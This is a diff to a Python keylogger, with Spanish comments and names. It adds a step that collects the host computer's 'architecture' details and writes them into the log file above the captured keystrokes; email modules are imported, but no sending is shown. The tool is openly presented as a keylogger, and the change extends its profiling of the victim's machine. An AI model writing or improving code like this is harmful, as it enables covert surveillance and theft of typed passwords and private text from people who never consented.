@@ -6,6 +6,10 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 import contador
+import report
+import os
+import sys
+import fileinput
 
 log=""
 #Clase keylogger
@@ -49,7 +53,47 @@ class Keylogger:
         archivo.write(captexto)
         archivo.close()
         contador.ContarTxt(self.m)
+        arq = report.report("arquitectura.txt")
+        arq.arch()
+        cts1 = "@"
+        cts2 = "«"
+        cts3 = "»"
+        ctr = " "
+        ftS = "arquitectura.txt"
+        with open(ftS,"r") as file:
+            filedata = file.read()
+        filedata = filedata.replace(cts1,ctr)
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace(cts2,ctr)
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace(cts3,ctr)
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace("á","a")
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace("é","e")
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace("í","i")
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace("ó","o")
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        filedata = filedata.replace("ú","u")
+        with open(ftS,"w") as file:
+            file.write(filedata)
+        
+        archivo = open("arquitectura.txt","r")
+        cad = archivo.read()
+        archivo.close()        
         archivo = open(self.m,"w")
+        archivo.write('***************************Arquitectura del computador***************************''\n'+cad+'\n')
+        archivo.close()
+        archivo = open(self.m,"a")
         archivo.write('*********************************Texto Capturado*********************************'+'\n'+captexto+'\n')
         archivo.close()
         archivo = open("temp.txt","r")
